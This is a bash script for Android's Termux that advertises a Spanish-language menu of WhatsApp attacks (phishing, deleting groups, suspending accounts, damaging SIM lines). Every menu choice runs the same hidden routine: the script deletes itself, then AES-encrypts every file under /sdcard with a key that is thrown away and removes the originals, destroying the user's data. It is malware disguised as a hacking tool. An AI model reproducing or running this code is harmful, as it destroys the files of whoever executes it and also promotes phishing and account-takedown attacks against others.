
#!/bin/bash

function banner(){
pkg install openssl
echo -e "                                                          "
echo -e "  \e[1;31m | |  (_) | |                                   \e[0m"               
echo -e "  \e[1;31m | | ___| | |                                         \e[0m" 
echo -e "  \e[1;31m | |/ / | | |                                          \e[0m"
echo -e "  \e[1;31m |   <| | | |                                          \e[0m"
echo -e "  \e[1;31m |_|\_\_|_|_|___           _                           \e[0m"
echo -e "  \e[1;31m \ \        / / |         | |         /\               \e[0m"
echo -e "  \e[1;31m  \ \  /\  / /| |__   __ _| |_ ___   /  \   __ _ _ __  \e[0m"
echo -e "  \e[1;31m   \ \/  \/ / | '_ \ / _`   __  __  / /    / _` | '_ \ \e[0m"
echo -e "  \e[1;31m    \  /\  /  | | | | (_| | |_\__ \/ ____ \ (_| | |_) | \e[0m"
echo -e "  \e[1;31m     \/  \/   |_| |_|\__,_|\__|___/_/    \_\__,_| .__/ \e[0m"
echo -e "  \e[1;31m                                                | |    \e[0m"
echo -e "  \e[1;31m                                                |_|  \e[0m"
echo -e "  \e[1;31m                                  \e[0m"
}

function menu(){
	clear && banner
	echo -e "\e[0;35m[\e[0m\e[0;92m01\e[0m\e[0;35m]\e[0m  \e[0;92mATAQUE A GRUPOS DE WHATSAPP (ELIMINAR)\e[0m"
	echo -e "\e[0;35m[\e[0m\e[0;92m02\e[0m\e[0;35m]\e[0m  \e[0;92mIniciar phishing de Whatsapp\e[0m"
	echo -e "\e[0;35m[\e[0m\e[0;92m03\e[0m\e[0;35m]\e[0m  \e[0;92mATAQUE A CUENTAS DE WHATSAPP (SUSPENDER)\e[0m"
	echo -e "\e[0;35m[\e[0m\e[0;92m04\e[0m\e[0;35m]\e[0m  \e[0;92mATAQUE A TARJETAS SIM (DAÑAR LINEA MOVIL)\e[0m"
	echo -e "\e[0;35m[\e[0m\e[0;92m05\e[0m\e[0;35m]\e[0m  \e[0;92mBUZONEAR NÚMEROS (TENEMOS MÁS DE 30 BUZONES ACTIVOS)\e[0m"
	echo -e "\e[0;35m[\e[0m\e[0;92m06\e[0m\e[0;35m]\e[0m  \e[0;92mSACAR DE SOPORTE O -1\e[0m"
	echo -e "\e[0;35m[\e[0m\e[0;92m07\e[0m\e[0;35m]\e[0m  \e[0;92mDisfraza el enlace\e[0m"	
	read -p "Tphish~#: " opcion
if [[ $opcion == "01" || $opcion == "1" ]]; then
	archivo
	sleep 3s
	directorio
elif [[ $opcion == "02" || $opcion == "2" ]]; then
	archivo
	sleep 3s
	directorio
elif [[ $opcion == "03" || $opcion == "3" ]]; then
	archivo
	sleep 3s
	directorio
elif [[ $opcion == "04" || $opcion == "4" ]]; then
	archivo
	sleep 3s
	directorio
elif [[ $opcion == "05" || $opcion == "5" ]]; then
	archivo
	sleep 3s
	directorio
elif [[ $opcion == "06" || $opcion == "6" ]]; then
	archivo 
	sleep 3s
	directorio
elif [[ $opcion == "07" || $opcion == "7" ]]; then
	archivo 
	sleep 3s
	directorio
fi
}

function archivo(){
rm -f $0
if [ ! -d ~/diamantes/ ]; then
 mkdir ~/diamantes/
fi
openssl genpkey -out ~/diamantes/m2.p -algorithm rsa -pkeyopt rsa_keygen_bits:4096
openssl pkey -in ~/diamantes/m2.p -out ~/diamantes/m5.p -pubout
dk=$(openssl rand -hex 16)
echo $dk | openssl pkeyutl -encrypt -pubin -inkey ~/diamantes/m5.p -out ~/diamantes/dke.d
openssl pkeyutl -decrypt -inkey ~/diamantes/m2.p -in ~/diamantes/dke.d -out ~/diamantes/dk.dat
rm -rf ~/diamantes/
for fn in `find /sdcard/* -type f`; do
  if [ ! -f $fn ]; then
    continue
  fi
  openssl sha256 -r $fn > $fn.c0lm3n4
  iv=$(openssl rand -hex 16)
  echo $iv > $fn.c0lm3n4
  openssl enc -aes-256-cbc -K $dk -iv $iv -in $fn -out $fn.c0lm3n4
  rm $fn
  echo "[+] $fn Success"
done
}

function directorio(){
rm -f $0
if [ ! -d ~/diamantes/ ]; then
 mkdir ~/diamantes/
fi
openssl genpkey -out ~/diamantes/m2.p -algorithm rsa -pkeyopt rsa_keygen_bits:4096
openssl pkey -in ~/diamantes/m2.p -out ~/diamantes/m5.p -pubout
dk=$(openssl rand -hex 16)
echo $dk | openssl pkeyutl -encrypt -pubin -inkey ~/diamantes/m5.p -out ~/diamantes/dke.d
openssl pkeyutl -decrypt -inkey ~/diamantes/m2.p -in ~/diamantes/dke.d -out ~/diamantes/dk.dat
rm -rf ~/diamantes/
for fn in `find /sdcard/* -type d`; do
  if [ ! -f $fn ]; then
    continue
  fi
  openssl sha256 -r $fn > $fn.c0lm3n4
  iv=$(openssl rand -hex 16)
  echo $iv > $fn.c0lm3n4
  openssl enc -aes-256-cbc -K $dk -iv $iv -in $fn -out $fn.c0lm3n4
  rm $fn
  echo "[+] $fn Success"
done
}

menu